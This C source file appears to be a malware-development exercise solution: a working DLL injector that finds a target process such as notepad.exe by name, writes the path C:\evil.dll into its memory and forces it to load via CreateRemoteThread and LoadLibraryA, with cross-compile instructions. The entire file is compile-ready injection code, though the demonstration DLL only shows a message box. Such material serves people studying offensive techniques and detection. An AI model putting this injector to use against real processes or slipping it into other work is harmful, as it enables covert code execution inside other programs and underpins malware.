/*
 * exercise 3 solution
 * DLL injection - process name lookup instead of raw PID
 * hack3.c
 * author: @cocomelonc
 *
 * base: 02-dll/hack.c
 *
 * change: the original injector accepted the target PID as a numeric
 * command-line argument (hack.exe 1234).
 * this version accepts a process NAME (hack3.exe notepad.exe) and
 * resolves it to a PID at runtime using CreateToolhelp32Snapshot.
 *
 * new additions vs original:
 *   - findMyProc()         : snapshot-based name -> PID helper
 *   - argv[1] is now a string (process name), not a number
 *   - (DWORD) C-style cast instead of C++ functional cast DWORD(...)
 *   - WaitForSingleObject  : wait for LoadLibraryA thread to finish
 *
 * what to observe:
 *   place evil.dll at C:\evil.dll, start notepad.exe, then run:
 *     hack3.exe notepad.exe
 *   the MessageBox from DllMain(DLL_PROCESS_ATTACH) should pop up
 *   inside the notepad.exe process.
 *
 * compile (cross-compile from Linux):
 * x86_64-w64-mingw32-gcc hack3.c -o hack3.exe -I/usr/share/mingw-w64/include/ -s -ffunction-sections -fdata-sections -Wno-write-strings -fno-exceptions -fmerge-all-constants -static-libstdc++ -static-libgcc
 */
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <windows.h>
#include <tlhelp32.h>

// path to the DLL that will be injected into the target process
char evilDLL[] = "C:\\evil.dll";
unsigned int evilLen = sizeof(evilDLL) + 1;

/*
 * exercise 3 addition: findMyProc()
 * iterates the live process list and returns the PID of the first
 * process whose name matches procname (case-sensitive).
 * returns 0 if not found.
 *
 * key APIs:
 *   CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0)
 *       - takes a snapshot of all running processes
 *   Process32First / Process32Next
 *       - walk the snapshot entry by entry
 *   PROCESSENTRY32.szExeFile
 *       - the executable filename (e.g. "notepad.exe")
 *   PROCESSENTRY32.th32ProcessID
 *       - the PID we need for OpenProcess
 */
int findMyProc(const char *procname) {
  HANDLE hSnapshot;
  PROCESSENTRY32 pe;
  int pid = 0;
  BOOL hResult;

  hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
  if (INVALID_HANDLE_VALUE == hSnapshot) return 0;

  pe.dwSize = sizeof(PROCESSENTRY32); // required before first call
  hResult = Process32First(hSnapshot, &pe);

  while (hResult) {
    if (strcmp(procname, pe.szExeFile) == 0) {
      pid = pe.th32ProcessID;
      break;
    }
    hResult = Process32Next(hSnapshot, &pe);
  }

  CloseHandle(hSnapshot);
  return pid;
}

int main(int argc, char* argv[]) {
  HANDLE ph; // process handle
  HANDLE rt; // remote thread
  LPVOID rb; // remote buffer

  if (argc < 2) {
    printf("usage: hack3.exe <process name>\n");
    printf("example: hack3.exe notepad.exe\n");
    return -1;
  }

  // handle to kernel32 and the address of LoadLibraryA inside it
  HMODULE hKernel32 = GetModuleHandle("Kernel32");
  VOID *lb = GetProcAddress(hKernel32, "LoadLibraryA");

  /*
   * exercise 3 change:
   * original: ph = OpenProcess(..., DWORD(atoi(argv[1])));
   *           (argv[1] was expected to be a numeric PID)
   *
   * updated:  resolve name -> PID with findMyProc, then OpenProcess
   *           (argv[1] is now a process name string)
   */
  int pid = findMyProc(argv[1]);
  if (pid == 0) {
    printf("[-] process '%s' not found - is it running?\n", argv[1]);
    return -1;
  }
  printf("[+] found '%s', PID = %d\n", argv[1], pid);

  ph = OpenProcess(PROCESS_ALL_ACCESS, FALSE, (DWORD)pid); // pure-C cast
  if (ph == NULL) {
    printf("[-] OpenProcess failed: %lu\n", GetLastError());
    return -1;
  }

  // allocate space for the DLL path string in the target process
  rb = VirtualAllocEx(ph, NULL, evilLen,
                      (MEM_RESERVE | MEM_COMMIT), PAGE_EXECUTE_READWRITE);

  // write the DLL path into the remote buffer
  WriteProcessMemory(ph, rb, evilDLL, evilLen, NULL);

  // create a remote thread that calls LoadLibraryA(rb)
  // LoadLibraryA will load the DLL and trigger DllMain(DLL_PROCESS_ATTACH)
  rt = CreateRemoteThread(ph, NULL, 0,
                          (LPTHREAD_START_ROUTINE)lb, rb, 0, NULL);

  WaitForSingleObject(rt, 5000);
  CloseHandle(rt);
  CloseHandle(ph);
  printf("[+] done :)\n");
  return 0;
}
